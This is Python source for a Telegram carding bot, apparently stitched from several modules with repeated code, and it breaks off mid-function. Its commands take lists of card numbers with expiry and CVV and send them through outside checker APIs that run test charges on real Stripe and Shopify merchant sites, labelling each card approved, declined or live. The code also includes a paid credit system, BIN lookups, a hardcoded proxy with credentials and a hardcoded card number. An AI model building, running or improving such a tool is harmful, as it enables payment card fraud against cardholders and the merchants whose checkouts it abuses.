    semaphore = asyncio.Semaphore(3)  # limit to 3 in parallel

    async with aiohttp.ClientSession() as session:
        async def worker(card):
            async with semaphore:
                result_text, status = await check_card(session, card)
                counters["checked"] += 1
                counters[status] = counters.get(status, 0) + 1
                # Push result into queue when ready
                await queue.put(result_text)

        # Start all workers in background
        tasks = [asyncio.create_task(worker(c)) for c in cards]

        async def consumer():
            while True:
                try:
                    # Wait for next result
                    result_text = await asyncio.wait_for(queue.get(), timeout=50)
                except asyncio.TimeoutError:
                    # Break if all workers finished and queue is empty
                    if all(t.done() for t in tasks):
                        break
                    continue

                # Add result line and update message
                results.append(result_text)
                elapsed = round(time.time() - start_time, 2)
                header = (
                    f"✘ <b>Total</b> ↣ {total}\n"
                    f"✘ <b>Checked</b> ↣ {counters['checked']}\n"
                    f"✘ <b>Approved</b> ↣ {counters['approved']}\n"
                    f"✘ <b>Declined</b> ↣ {counters['declined']}\n"
                    f"✘ <b>Error</b> ↣ {counters['error']}\n"
                    f"✘ <b>Time</b> ↣ {elapsed}s"
                )
                content = f"{header}\n\n<b>{results_header}</b>\n{separator}\n" + f"\n{separator}\n".join(results)
                try:
                    await msg.edit_text(content, parse_mode="HTML")
                except TelegramError:
                    pass

                await asyncio.sleep(1)  # wait 1s before showing next line

            # Final update after all done
            elapsed = round(time.time() - start_time, 2)
            header = (
                f"✘ <b>Total</b> ↣ {total}\n"
                f"✘ <b>Checked</b> ↣ {counters['checked']}\n"
                f"✘ <b>Approved</b> ↣ {counters['approved']}\n"
                f"✘ <b>Declined</b> ↣ {counters['declined']}\n"
                f"✘ <b>Error</b> ↣ {counters['error']}\n"
                f"✘ <b>Time</b> ↣ {elapsed}s"
            )
            content = f"{header}\n\n<b>{results_header}</b>\n{separator}\n" + f"\n{separator}\n".join(results)
            await msg.edit_text(content, parse_mode="HTML")

        await asyncio.gather(*tasks, consumer())


import time
import asyncio
import logging
from telegram import Update
from telegram.ext import ContextTypes

# Cooldown settings
RATE_LIMIT_SECONDS = 5
user_last_command_time = {}  # {user_id: last_time}

# --- /mchk Command Handler ---
async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    current_time = time.time()

    try:
        # --- Step 1: Plan validation ---
        if not await check_authorization(update, context):
            return  # unauthorized users stop here

        # --- Step 2: 5s cooldown check ---
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < RATE_LIMIT_SECONDS:
                remaining = round(RATE_LIMIT_SECONDS - elapsed, 2)
                await update.message.reply_text(
                    f"⚠️ Please wait <b>{remaining}</b> seconds before using /mchk again.",
                    parse_mode="HTML"
                )
                return

        # --- Step 3: Credit check ---
        has_credit = await consume_credit(user_id)
        if not has_credit:
            await update.message.reply_text(
                "❌ You don’t have enough credits to use <b>/mchk</b>.",
                parse_mode="HTML"
            )
            return

        # Update last command time
        user_last_command_time[user_id] = current_time

        # --- Step 4: Collect cards ---
        cards = []
        if context.args:
            cards = context.args
        elif update.message.reply_to_message and update.message.reply_to_message.text:
            cards = extract_cards_from_text(update.message.reply_to_message.text)

        if not cards:
            await update.message.reply_text(
                "❌ No cards found.\nUsage: <code>/mchk card1|mm|yy|cvv ...</code>\n"
                "Or reply to a message containing cards.", 
                parse_mode="HTML"
            )
            return

        # --- Step 5: Send immediate processing message ---
        msg = await update.message.reply_text("⏳ <b>Processing your cards...</b>", parse_mode="HTML")

        # --- Step 6: Run background task (non-blocking) ---
        asyncio.create_task(run_mass_check(msg, cards, user_id))

    except Exception as e:
        logging.error(f"[mchk_command] Error: {e}", exc_info=True)
        try:
            await update.message.reply_text("⚠️ An unexpected error occurred while processing your request.")
        except Exception:
            pass







import asyncio
import aiohttp
import time
import re
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.error import TelegramError
from db import get_user, update_user  # your async DB functions




# --- PLAN VALIDATION ---
async def has_active_paid_plan(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if not user_data:
        return False

    plan = str(user_data.get("plan", "Free"))
    expiry = user_data.get("plan_expiry", "N/A")

    if plan.lower() == "free":
        return False

    if expiry != "N/A":
        try:
            expiry_date = datetime.strptime(expiry, "%d-%m-%Y")
            if expiry_date < datetime.now():
                return False
        except Exception:
            return False
    return True

async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    chat_type = update.effective_chat.type

    if user_id == OWNER_ID:
        return True

    if not await has_active_paid_plan(user_id):
        await update.effective_message.reply_text(
            "🚫 You need an *active paid plan* to use this command.\n💳 or use for free in our group."
        )
        return False
    return True
    

async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            return True
    except Exception as e:
        print(f"[consume_credit] Error updating user {user_id}: {e}")
    return False

# API and concurrency settings
API_URL_TEMPLATE = "https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
CONCURRENCY = 5
UPDATE_INTERVAL = 3  # seconds
RATE_LIMIT_SECONDS = 5
user_last_command_time = {}

def extract_cards_from_text(text: str) -> list[str]:
    """Extracts card-like strings from a given text."""
    return re.findall(r'\d{12,16}[ |]\d{2,4}[ |]\d{2,4}[ |]\d{3,4}', text)

async def check_card(session, card: str):
    """Send card to API and return formatted result and status type."""
    try:
        async with session.get(API_URL_TEMPLATE + card, timeout=50) as resp:
            data = await resp.json()

        status = str(data.get("status", "Unknown")).lower()

        # Normalize status outputs
        if "approved" in status:
            formatted_status = "<b><i>Approved ✅</i></b>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "approved"

        elif "declined" in status:
            formatted_status = "<i>Declined ❌</i>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "declined"

        elif "unknown" in status:
            formatted_status = "<i>Unknown 🚫</i>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "declined"

        else:
            formatted_status = f"<i>{data.get('status', 'Error')} ❌</i>"
            return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "declined"

    except (aiohttp.ClientError, asyncio.TimeoutError):
        formatted_status = "<b><i>Error: Network ❌</i></b>"
        return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "error"

    except Exception:
        formatted_status = "<b><i>Error: Unknown ❌</i></b>"
        return f"<code>{card}</code>\n<b>Status ➳</b> {formatted_status}", "error"



async def run_mass_check(msg, cards, user_id):
    total = len(cards)
    counters = {"checked": 0, "approved": 0, "declined": 0, "error": 0}
    results = []
    separator = "──────── ⸙ ─────────"
    results_header = "𝗠𝗮𝘀𝐬 𝗖𝗵𝗲𝗰𝗸"
    start_time = time.time()

    queue = asyncio.Queue()
    semaphore = asyncio.Semaphore(5)  # limit to 3 in parallel

    async with aiohttp.ClientSession() as session:
        async def worker(card):
            async with semaphore:
                result_text, status = await check_card(session, card)
                counters["checked"] += 1
                counters[status] = counters.get(status, 0) + 1
                # Push result into queue when ready
                await queue.put(result_text)

        # Start all workers in background
        tasks = [asyncio.create_task(worker(c)) for c in cards]

        async def consumer():
            while True:
                try:
                    # Wait for next result
                    result_text = await asyncio.wait_for(queue.get(), timeout=50)
                except asyncio.TimeoutError:
                    # Break if all workers finished and queue is empty
                    if all(t.done() for t in tasks):
                        break
                    continue

                # Add result line and update message
                results.append(result_text)
                elapsed = round(time.time() - start_time, 2)
                header = (
                    f"✘ <b>Total</b> ↣ {total}\n"
                    f"✘ <b>Checked</b> ↣ {counters['checked']}\n"
                    f"✘ <b>Approved</b> ↣ {counters['approved']}\n"
                    f"✘ <b>Declined</b> ↣ {counters['declined']}\n"
                    f"✘ <b>Error</b> ↣ {counters['error']}\n"
                    f"✘ <b>Time</b> ↣ {elapsed}s"
                )
                content = f"{header}\n\n<b>{results_header}</b>\n{separator}\n" + f"\n{separator}\n".join(results)
                try:
                    await msg.edit_text(content, parse_mode="HTML")
                except TelegramError:
                    pass

                await asyncio.sleep(1)  # wait 1s before showing next line

            # Final update after all done
            elapsed = round(time.time() - start_time, 2)
            header = (
                f"✘ <b>Total</b> ↣ {total}\n"
                f"✘ <b>Checked</b> ↣ {counters['checked']}\n"
                f"✘ <b>Approved</b> ↣ {counters['approved']}\n"
                f"✘ <b>Declined</b> ↣ {counters['declined']}\n"
                f"✘ <b>Error</b> ↣ {counters['error']}\n"
                f"✘ <b>Time</b> ↣ {elapsed}s"
            )
            content = f"{header}\n\n<b>{results_header}</b>\n{separator}\n" + f"\n{separator}\n".join(results)
            await msg.edit_text(content, parse_mode="HTML")

        await asyncio.gather(*tasks, consumer())

# --- /mass Command Handler (30 cards) ---
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    current_time = time.time()

    try:
        # Plan validation
        if not await check_authorization(update, context):
            return

        # 5 sec cooldown
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < RATE_LIMIT_SECONDS:
                remaining = round(RATE_LIMIT_SECONDS - elapsed, 5)
                await update.message.reply_text(
                    f"⚠️ Please wait <b>{remaining}</b> seconds before using /mass again.",
                    parse_mode="HTML"
                )
                return

        # Credit check
        has_credit = await consume_credit(user_id)
        if not has_credit:
            await update.message.reply_text(
                "❌ You don’t have enough credits to use <b>/mass</b>.",
                parse_mode="HTML"
            )
            return

        user_last_command_time[user_id] = current_time

        # Collect cards
        cards = []
        if context.args:
            cards = context.args
        elif update.message.reply_to_message and update.message.reply_to_message.text:
            cards = extract_cards_from_text(update.message.reply_to_message.text)

        if not cards:
            await update.message.reply_text(
                "❌ No cards found.\nUsage: <code>/mass card|mm|yy|cvv ...</code>", 
                parse_mode="HTML"
            )
            return

        # Limit 30
        if len(cards) > 30:
            await update.message.reply_text(
                f"⚠️ You can check a maximum of <b>30</b> cards at once.\n"
                f"You provided <b>{len(cards)}</b>.",
                parse_mode="HTML"
            )
            cards = cards[:30]

        # Send processing msg
        msg = await update.message.reply_text(
            f"⏳ <b>Processing {len(cards)} cards...</b>",
            parse_mode="HTML"
        )

        # Run in background
        asyncio.create_task(run_mass_check(msg, cards, user_id))

    except Exception as e:
        logging.error(f"[mass_command] Error: {e}", exc_info=True)
        await update.message.reply_text("⚠️ An unexpected error occurred while processing your request.")



import time
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

from db import get_user, update_user  # Your DB functions
from config import AUTHORIZED_CHATS   # ✅ Add your group IDs here

OWNER_ID = 8493360284
user_cooldowns = {}

# ─── Authorization & Access for /mtchk ──────────────────────
async def check_mtchk_access(user_id: int, chat, update: Update) -> bool:
    """
    ✅ In authorized groups → allow all users (must have credits).
    ✅ In private chats → require paid plan + credits.
    👑 Owner bypasses everything.
    """
    # 👑 Owner bypass
    if user_id == OWNER_ID:
        return True

    # 📂 Get user data
    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text(
            "❌ You are not registered or have no active plan.",
            parse_mode=ParseMode.MARKDOWN
        )
        return False

    credits = user_data.get("credits", 0)

    # 👥 Group logic → only credits required
    if chat.type in ["group", "supergroup"] and chat.id in AUTHORIZED_CHATS:
        if credits <= 0:
            await update.effective_message.reply_text(
                "❌ You don't have enough credits to run this command.",
                parse_mode=ParseMode.MARKDOWN
            )
            return False
        return True

    # 💬 Private chat logic → must be paid plan + credits
    plan = user_data.get("plan", "Free")

    if plan.lower() == "free":
        await update.effective_message.reply_text(
            "🚫 This command is available members having plan.\n"
            "💳 Buy a plan or join our authorized group to use.",
            parse_mode=ParseMode.MARKDOWN
        )
        return False

    expiry = user_data.get("plan_expiry", "N/A")
    if expiry != "N/A":
        try:
            expiry_date = datetime.strptime(expiry, "%d-%m-%Y")
            if expiry_date < datetime.now():
                await update.effective_message.reply_text(
                    "⏳ Your plan has expired. Renew to use this command.",
                    parse_mode=ParseMode.MARKDOWN
                )
                return False
        except Exception:
            pass

    if credits <= 0:
        await update.effective_message.reply_text(
            "❌ You don't have enough credits to run this command.",
            parse_mode=ParseMode.MARKDOWN
        )
        return False

    return True


# ─── Cooldown ──────────────────────────────
user_cooldowns = {}  # { user_id: { "mtchk": timestamp } }

async def enforce_cooldown(user_id: int, update: Update) -> bool:
    cooldown = 5  # seconds
    now = time.time()
    last = user_cooldowns.get(user_id, 0)
    if now - last < cooldown:
        remaining = round(cooldown - (now - last), 2)
        await update.effective_message.reply_text(
            escape_markdown(f"⏳ Cooldown active. Wait {remaining} seconds.", version=2),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False
    user_cooldowns[user_id] = now
    return True




# ─── Credit Consumption ──────────────────────────────
async def consume_credit(user_id: int) -> bool:
    """
    Deduct one credit from the user.
    Returns True if successful, False if no credits left.
    """
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False





# ─── Background Task ──────────────────────────────
import asyncio
import aiohttp
import os
import re
import json
from telegram import Update, InputFile
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

# Assuming these functions are defined elsewhere in your project
# from your_module import check_paid_access, enforce_cooldown

# ─── /mtchk Handler ──────────────────────────────
import os
import asyncio
import json
import re
import aiohttp
from telegram import Update, InputFile
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

# === Normalize status text like /mchk & /mass ===
def normalize_status_text(api_status: str) -> str:
    try:
        lower_status = api_status.lower()
        if "approved" in lower_status or "live" in lower_status:
            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        elif "declined" in lower_status or "insufficient" in lower_status:
            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
        elif "ccn" in lower_status:
            return "💳 𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
        elif "3ds" in lower_status or "redirect" in lower_status:
            return "⚠️ 𝟯𝗗𝗦"
        elif "error" in lower_status:
            return "❌ 𝗘𝗥𝗥𝗢𝗥"
        else:
            return "❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡"
    except Exception:
        return "❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡"
        
# ─── /mtchk Command ──────────────────────────────
async def mtchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat = update.effective_chat

    if not await check_mtchk_access(user_id, chat, update):
        return

    if not await enforce_cooldown(user_id, update):
        return

    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits.")
        return

    document = update.message.document or (
        update.message.reply_to_message and update.message.reply_to_message.document
    )
    if not document:
        await update.message.reply_text("📂 Please send or reply to a txt file containing up to 50 cards.")
        return

    if not document.file_name.endswith(".txt"):
        await update.message.reply_text("⚠️ Only txt files are supported.")
        return

    file_path = f"input_cards_{user_id}.txt"
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(custom_path=file_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download file: {e}")
        return

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to read file: {e}")
        return
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

    if len(cards) > 50:
        await update.message.reply_text("⚠️ Maximum 50 cards allowed per file.")
        return

    estimated_time = max(len(cards) / 7, 1)
    processing_msg = await update.message.reply_text(
        f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
        f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {len(cards)} | ⌚𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐓𝐢𝐦𝐞 ➼ ~{estimated_time:.0f}s\n"
        f"✦━━━━━━━━━━✦\n"
        f"▌ [□□□□□□□□□□] 0/{len(cards)} ▌\n"
        f"✦━━━━━━━━━━━━━━━━━━━✦"
    )

    asyncio.create_task(
        background_check_multi(update, context, cards, processing_msg),
        name=f"mtchk_user_{user_id}"
    )

# ─── Background Task ──────────────────────────────
async def background_check_multi(update, context, cards, processing_msg):
    results = []
    approved = 0
    declined = 0
    ccn_live = 0
    threed = 0
    unknown = 0
    total = len(cards)

    async def escape_md(text):
        special_chars = r'\_*[]()~`>#+-=|{}.!'
        return re.sub(f"([{re.escape(special_chars)}])", r"\\\1", text)

    async def check_card_with_semaphore(session, card, semaphore):
        async with semaphore:
            return await check_card(session, card)

    async def check_card(session, card):
        try:
            async with session.get(
                f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={card}",
                timeout=45
            ) as resp:
                text_data = await resp.text()
                try:
                    json_data = json.loads(text_data)
                    status_text = json_data.get("status", "Unknown")
                except (json.JSONDecodeError, KeyError):
                    status_text = text_data.strip()
                return card, status_text
        except Exception as e:
            return card, f"Error: {str(e)}"

    async def update_progress(current_count):
        filled_len = round((current_count / total) * 10)
        empty_len = 10 - filled_len
        bar = "■" * filled_len + "□" * empty_len
        progress_text = (
            f"━━ ⚡𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵⚡ ━━\n"
            f"💳𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 ➼ {total} | ✅𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➼ {current_count}/{total}\n"
            f"✦━━━━━━━━━━✦\n"
            f"▌ [{bar}] ▌\n"
            f"✦━━━━━━━━━━━━━━━━━━━✦"
        )
        try:
            await processing_msg.edit_text(await escape_md(progress_text), parse_mode=ParseMode.MARKDOWN_V2)
        except Exception:
            pass

    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(5)
        tasks = [check_card_with_semaphore(session, card, semaphore) for card in cards]

        for i, task in enumerate(asyncio.as_completed(tasks)):
            card, raw_status = await task
            styled_status = normalize_status_text(raw_status)

            # Increment counters based on styled status
            if "✅" in styled_status:
                approved += 1
            elif "❌" in styled_status and "𝗘𝗥𝗥𝗢𝗥" not in styled_status:
                declined += 1
            elif "𝗖𝗖𝗡" in styled_status:
                ccn_live += 1
            elif "𝟯𝗗𝗦" in styled_status:
                threed += 1
            else:
                unknown += 1

            # ✅ Write same stylish response as /mchk & /mass
            results.append(f"{card} → {styled_status}")

            await update_progress(len(results))

    # Save file
    output_filename = "checked.txt"
    with open(output_filename, "w", encoding="utf-8") as f:
        f.write("\n".join(results))

    try:
        await processing_msg.delete()
    except Exception:
        pass

    summary = (
        "✦━━━━ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ━━━━✦\n" 
        f"📊 𝗧𝗼𝘁𝗮𝗹     » {total}\n"
        f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  » {approved}\n"
        f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  » {declined}\n"
        f"⚠️ 𝟯𝗗𝗦        » {threed}\n"
        f"💳 𝗖𝗖𝗡 𝗟𝗶𝘃𝗲  » {ccn_live}\n"
        f"❓ 𝗨𝗻𝗸𝗻𝗼𝘄𝗻    » {unknown}\n"
        "✦━━━━━━━━━━━━━━━━━━━✦"
    )

    try:
        with open(output_filename, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=output_filename),
                caption=summary
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send results: {e}")

    try:
        os.remove(output_filename)
    except Exception:
        pass



import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- Background /sh processing ---
import json
import logging
from html import escape
import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from bin import get_bin_info  # <-- your custom BIN module
from db import get_user, update_user  # credits system

logger = logging.getLogger(__name__)


# --- Credit system helper ---
async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            return True
    except Exception as e:
        logger.warning(f"[consume_credit] Error for {user_id}: {e}")
    return False


# --- Shopify Processor ---
async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: <code>/sh 1234567812345678|12|2028|123</code>",
                parse_mode=ParseMode.HTML
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"

        # --- API URL (fixed f-string) ---
        api_url = (
            f"https://auto-shopify-6cz4.onrender.com/index.php"
            f"?site=https://tackletech3d.com"
            f"&cc={cc}|{mm}|{yy}|{cvv}"
            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
        )

        processing_msg = await update.message.reply_text("⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁…")

        # --- Make API request ---
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Extract fields from API ---
        response = data.get("Response", "Unknown")
        status = data.get("Status", "Unknown")
        price = data.get("Price", "N/A")
        gateway = data.get("Gateway", "Shopify")

        # --- BIN lookup (your exact logic, unchanged) ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)

            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
            card_type = bin_details.get("type", "N/A")
            card_level = bin_details.get("brand", "N/A")
            card_length = bin_details.get("length", "N/A")
            luhn_check = bin_details.get("luhn", "N/A")
            bank_phone = bin_details.get("bank_phone", "N/A")
            bank_url = bin_details.get("bank_url", "N/A")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = card_type = card_level = card_length = luhn_check = bank_phone = bank_url = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Fetch updated user credits ---
        updated_user = await get_user(user.id)
        credits_left = updated_user.get("credits", 0)

        # --- User info ---
        requester = f"@{user.username}" if user.username else str(user.id)

        # --- Developer info ---
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

        # --- Bullet + group link ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Final formatted message ---
        formatted_msg = (
            f"═══[ <b>SHOPIFY</b> ]═══\n"
            f"{bullet_link} <b>Card</b> ➜ <code>{escape(full_card)}</code>\n"
            f"{bullet_link} <b>Gateway</b> ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟭𝟭$\n"
            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response)}</i>\n"
            f"{bullet_link} <b>Price</b> ➜ {escape(price)} 💸\n"
            f"――――――――――――――――\n"
            f"{bullet_link} <b>Brand</b> ➜ <code>{escape(brand)}</code>\n"
            f"{bullet_link} <b>Bank</b> ➜ <code>{escape(issuer)}</code>\n"
            f"{bullet_link} <b>Country</b> ➜ <code>{escape(country_name)} {country_flag}</code>\n"
            f"――――――――――――――――\n"
            f"{bullet_link} <b>Request By</b> ➜ {requester}\n"
            f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
            f"――――――――――――――――"
        )

        await processing_msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /sh")
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass




# --- Main /sh command ---
async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    # --- Check arguments ---
    if not context.args:
        await update.message.reply_text(
            "⚠️ Usage: <code>/sh card|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return

    payload = " ".join(context.args).strip()

    # --- Run in background ---
    asyncio.create_task(process_sh(update, context, payload))






import asyncio
import aiohttp
import json
import re
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user, init_db

# Ensure DB is initialized
asyncio.get_event_loop().run_until_complete(init_db())

async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Telegram command: /seturl <site_url>"""
    user = update.effective_user
    user_id = user.id

    # --- Check arguments ---
    if not context.args:
        await update.message.reply_text(
            "❌ 𝙐𝙨𝙖𝙜𝙚: /𝙨𝙚𝙩𝙪𝙧𝙡 {𝙨𝙞𝙩𝙚_𝙪𝙧𝙡}",
            parse_mode=ParseMode.HTML
        )
        return

    site_input = context.args[0].strip()
    if not site_input.startswith(("http://", "https://")):
        site_input = f"https://{site_input}"

    # --- Get current user data ---
    user_data = await get_user(user_id)

    # --- Automatically remove existing custom URL ---
    if user_data.get("custom_url"):
        await update_user(user_id, custom_url=None)

    # --- Send initial processing message ---
    processing_msg = await update.message.reply_text(
        f"⏳ 𝓐𝓭𝓭𝓲𝓷𝓰 𝓤𝓡𝐋: <code>{escape(site_input)}</code>...",
        parse_mode=ParseMode.HTML
    )

    # --- Launch background worker ---
    asyncio.create_task(
        process_seturl(user, user_id, site_input, processing_msg)
    )


async def process_seturl(user, user_id, site_input, processing_msg):
    """Background worker that does the API call + DB update"""

    api_url = (
        "https://auto-shopify-6cz4.onrender.com/index.php"
        f"?site={site_input}"
        "&cc=5242430428405662|03|28|3023"
        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
    )

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=50) as resp:
                raw_text = await resp.text()

        # --- Parse JSON safely ---
        try:
            data = json.loads(raw_text)
        except json.JSONDecodeError:
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(raw_text[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Extract fields ---
        response = data.get("Response", "Unknown")
        status = data.get("Status", "Unknown")
        price = data.get("Price", "0.0")
        gateway = data.get("Gateway", "N/A")

        # --- Update user DB ---
        await update_user(user_id, custom_url=site_input)

        # --- Format response ---
        requester = f"@{user.username}" if user.username else str(user.id)
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_text = "[⌇]"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'

        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if status.lower() == "true" else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"

        formatted_msg = (
            f"═══[ <b>{site_status}</b> ]═══\n"
            f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➜ <code>{escape(site_input)}</code>\n"
            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙉𝙤𝙧𝙢𝙖𝙡\n"
            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response)}</i>\n"
            f"{bullet_link} <b>𝐏𝐫𝐢𝐜𝐞</b> ➜ {escape(price)}$ 💸\n"
            f"――――――――――――――――\n"
            f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐁𝐲</b> ➜ {requester}\n"
            f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
            f"――――――――――――――――"
        )

        await processing_msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        await processing_msg.edit_text(
